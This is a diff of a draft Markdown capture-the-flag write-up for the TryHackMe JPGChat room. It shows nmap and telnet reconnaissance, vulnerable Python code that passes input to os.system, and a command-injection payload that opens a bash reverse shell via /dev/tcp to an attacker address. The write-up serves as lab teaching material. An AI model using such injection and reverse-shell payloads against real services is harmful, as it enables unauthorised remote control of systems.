@@ -14,17 +14,20 @@ echo "10.10.A.B jpgchat.thm >> /etc/hosts"
 
 Nmap show only ports 22 and 3000 open.
 
-> add nmap screenshot
+***add nmap screenshot***
 
-To interact with port 3000 we tried telnet and received the following text:
+To interact with port 3000 we tried *telnet* and received the following text:
+
 ```
+$ telnet jpgchat.thm 3000
 Welcome to JPChat
 the source code of this service can be found at our admin's github
 MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
 REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
 ```
-> Mention the hint on tryhackme
-So we use nc now to interact:
+***Mention the hint on tryhackme***
+
+So we use *nc* now to interact:
 
 ```bash
 echo "[REPORT]" | nc jpgchat.thm 3000
@@ -55,9 +58,11 @@ os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
 
 So what we need is to escape a bash command to get a reverse shell:
 
+```bash
 echo "[REPORT]\n username \n 0<&196;exec 196<>/dev/tcp/10.11.X.Y/4243; bash <&196 >&196 2>&196;" | nc jpgchat.thm 3000
+```
 
-> Mention about the semicolon
+***Mention about the semicolon***
 
 
 Remember to have have nc listening on the specific port in your attack machine:
